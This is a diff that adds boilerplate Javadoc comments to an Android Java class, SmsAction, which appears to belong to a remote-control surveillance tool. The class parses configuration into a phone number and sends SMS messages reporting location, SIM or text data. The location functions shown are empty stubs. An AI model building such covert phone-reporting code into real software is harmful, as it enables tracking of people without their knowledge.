@@ -28,15 +28,26 @@ import com.ht.RCSAndroidGUI.utils.WChar;
 public class SmsAction extends SubAction {
 
 	// #ifdef DEBUG
+	/** The debug. */
 	static Debug debug = new Debug("SmsAction");
 	// #endif
 
+	/** The Constant TYPE_LOCATION. */
 	private static final int TYPE_LOCATION = 1;
+	
+	/** The Constant TYPE_SIM. */
 	private static final int TYPE_SIM = 2;
+	
+	/** The Constant TYPE_TEXT. */
 	private static final int TYPE_TEXT = 3;
 
+	/** The number. */
 	String number;
+	
+	/** The text. */
 	String text;
+	
+	/** The type. */
 	int type;
 
 	/**
@@ -82,22 +93,41 @@ public class SmsAction extends SubAction {
 		}
 	}
 
+	/**
+	 * Error location.
+	 */
 	private void errorLocation() {
 		if (!getCellPosition()) {
 			sendSMS("Cell and GPS info not available");
 		}
 	}
 
+	/**
+	 * Gets the cell position.
+	 *
+	 * @return the cell position
+	 */
 	private boolean getCellPosition() {
 		// TODO Auto-generated method stub
 		return false;
 	}
 
+	/**
+	 * Gets the gPS position.
+	 *
+	 * @return the gPS position
+	 */
 	private boolean getGPSPosition() {
 		// TODO Auto-generated method stub
 		return false;
 	}
 
+	/**
+	 * Send sms.
+	 *
+	 * @param text the text
+	 * @return true, if successful
+	 */
 	private boolean sendSMS(final String text) {
 		final Uri smsUri = Uri.parse("tel:" + number);
 		final Intent intent = new Intent(Intent.ACTION_VIEW, smsUri);
@@ -107,6 +137,12 @@ public class SmsAction extends SubAction {
 		return true;
 	}
 
+	/**
+	 * Parses the.
+	 *
+	 * @param confParams the conf params
+	 * @return true, if successful
+	 */
 	protected boolean parse(final byte[] confParams) {
 		final DataBuffer databuffer = new DataBuffer(confParams, 0,
 				confParams.length);
@@ -163,6 +199,9 @@ public class SmsAction extends SubAction {
 		return true;
 	}
 
+	/* (non-Javadoc)
+	 * @see java.lang.Object#toString()
+	 */
 	@Override
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
